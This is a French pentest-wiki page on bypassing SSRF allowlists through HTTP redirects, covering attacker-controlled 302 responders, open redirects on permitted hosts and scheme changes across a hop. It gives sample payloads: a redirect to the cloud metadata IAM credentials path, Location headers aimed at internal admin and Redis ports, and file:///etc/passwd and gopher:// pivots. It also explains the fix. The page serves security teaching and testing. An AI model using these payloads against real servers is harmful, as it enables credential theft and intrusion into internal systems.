---
title: "Contournement d'allowlist SSRF basé sur redirection"
description: "Une URL sur un hôte autorisé qui répond par une redirection vers une cible interne déjoue un validateur qui ne vérifie que l'URL soumise, car le client suit la redirection jusqu'à la destination réelle."
keywords:
  - redirection SSRF
  - open redirect
  - 302 vers interne
  - en-tête Location
  - contournement d'allowlist
  - suivre les redirections
---

# Contournement basé sur redirection

La validation s'exécute généralement sur l'URL que l'attaquant soumet. Si cette URL pointe vers un hôte autorisé mais que l'hôte répond par une redirection vers une adresse interne, un client qui suit les redirections valide la première URL et se connecte à la seconde. La vérification voit une cible externe, autorisée ; le socket atteint `127.0.0.1` ou le service de métadonnées.

## La structure à deux sauts

L'attaquant fournit une URL dont l'hôte passe l'allowlist. Cet hôte, que l'attaquant contrôle ou qui présente une faille d'open redirect, répond par un `3xx` et un `Location` pointant vers l'intérieur :

```
Submitted:  https://attacker.example/r
Response:   HTTP/1.1 302 Found
            Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Le validateur approuve `attacker.example` (public, autorisé). Le client, suivant la redirection, émet la seconde requête vers l'endpoint de métadonnées et renvoie son corps. N'importe quelle cible interne fonctionne comme `Location` :

```
Location: http://127.0.0.1:8080/admin
Location: http://10.0.0.5:6379/
```

## Open redirects sur des hôtes autorisés

Lorsque l'attaquant ne peut pas héberger le premier endpoint, un open redirect sur un hôte déjà autorisé sert le même objectif. Un domaine permis doté d'un paramètre de redirection devient le premier saut :

```
https://allowed.example/redirect?next=http://127.0.0.1/
https://allowed.example/out?url=http%3A%2F%2F169.254.169.254%2F
```

L'URL soumise est indiscutablement sur l'allowlist, pourtant elle fait rebondir le client vers l'intérieur.

## Changements de scheme à travers le saut

Certains clients autorisent le scheme à changer lors d'une redirection, ce qui transforme un contournement par redirection en attaque de scheme : un `Location` de `file:///etc/passwd` ou `gopher://127.0.0.1:6379/_...` fait pivoter un fetch HTTP vers une lecture locale ou une écriture socket brute. Que cela fonctionne dépend de la politique de redirection cross-scheme du client, donc testez un `Location` `file://` ou `gopher://` une fois qu'une redirection HTTP est confirmée suivie.

## Pourquoi cela bat la validation au moment de la soumission

La faille est de valider la cible de la requête une seule fois, à la soumission, et de faire confiance à chaque saut suivant. Revalider la destination de chaque redirection contre la politique (ou désactiver le suivi de redirections sur le sink) la ferme. En attendant, la redirection est le moyen le plus fiable de franchir une allowlist qui n'inspecte que l'URL que l'utilisateur a tapée. La cible interne finale utilise encore les encodages d'[Authority](../authority/index.md) lorsque sa forme littérale est filtrée.

## Outils

- **Endpoint de redirection contrôlé par l'attaquant** : un répondeur `3xx` hébergé qui renvoie un `Location` pointant vers la cible interne.
- **curl -L** : suivre les redirections en ligne de commande pour confirmer que le second saut est récupéré.
- **Burp Suite** : soumettre l'URL du premier saut et observer la requête suivie dans l'historique HTTP.
- **Burp Collaborator** : héberger l'endpoint de redirection et confirmer le saut vers l'intérieur en out-of-band.

## Références

- [OWASP: Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
